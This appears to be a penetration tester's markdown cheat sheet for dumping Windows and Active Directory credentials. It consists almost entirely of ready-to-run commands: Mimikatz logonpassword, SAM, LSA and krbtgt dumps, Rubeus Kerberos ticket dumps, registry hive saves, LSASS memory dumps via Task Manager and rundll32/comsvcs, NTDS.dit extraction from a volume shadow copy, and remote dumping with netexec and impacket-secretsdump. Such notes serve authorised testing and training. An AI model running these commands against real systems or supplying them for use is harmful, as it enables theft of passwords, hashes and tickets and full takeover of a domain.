---
tags:
  - Authenticated
  - Elevated
  - Impacket
  - Kerberos
  - LSASS
  - Lateral-Movement
  - Mimikatz
  - Privilege-Escalation
  - Rubeus
  - AD
---
## Locally
---
### **Mimikatz**

**Dump all**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
Output to file with log
```powershell
.\mimikatz.exe "log C:\path\to\mimikatz.log" "privilege::debug" "sekurlsa::logonpasswords" "log" "exit"
```
Output to file with redirection
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > C:\path\to\mimi-output.txt
```
**Dump SAM** (Local passwords)
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::sam /patchlsadsu" exit
```
**Dump LSA** (DC)
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
```
**Target krbtgt** (for golden ticket generation)
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt" exit
```
### **Rubeus**
#### Kerberos Tickets
List cached tickets
- Non elevated: List current users
- Elevated: List everyones
```shell
Rubeus.exe triage
```
Specify service
```
Rubeus.exe triage /service:ldap
```
Dump tickets
- Non elevated: dump current users
```shell
Rubeus.exe dump
```
Dump all tickets by targeting krbtgt (Elevated)
```powershell
Rubeus.exe dump /service:krbtgt
```
### Alternative Methods
**Save SAM and SYSTEM/SECURITY, extract locally**
!!! alert "note"
	we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts
```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
Dump locally
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
**Dump lsass with task manager**
!!! alert "GUI access required"
`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file` **A file called `lsass.DMP` is created and saved in:

```plaintext
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

**Rundll32.exe & Comsvcs.dll Method**
!!! alert "Will absolutely be flagged by AV/EDR"
**Get lsass PID**
```cmd
tasklist /svc
```
```powershell
Get-Process lsass
```
Create dumpfile with rundll32
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

!!! alert "With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`)."
**Use Pypykatz to Extract Credentials (on attack box)**
```bash
pypykatz lsa minidump lsass.dmp 
```
#### NTDS.dit Dumping
(Need DA or local admin on DC)
**Shadow Copy** 
```cmd
vssadmin CREATE SHADOW /For=C:
```
Copying NTDS.dit from the VSS
```bat
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Dump locally
```bash
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```
## Remotely
---
### netexec
**LSA** (local admin required)
```bash
nxc smb 10.129.42.198 -u '' -p '' --local-auth --lsa
```
**SAM** (local admin required)
```bash
nxc smb 10.129.42.198 -u '' -p '' --local-auth --sam
```
**NTDS** (DA or local admin on DC required)
```bash
nxc smb 10.129.201.57 -u '' -p '' --ntds
```
#### impacket
Dump everything (local admin required)
```bash
impacket-secretsdump 'domain.local'/'<user>':'<pass>'@'IP' -dc-ip <DCIP>
```
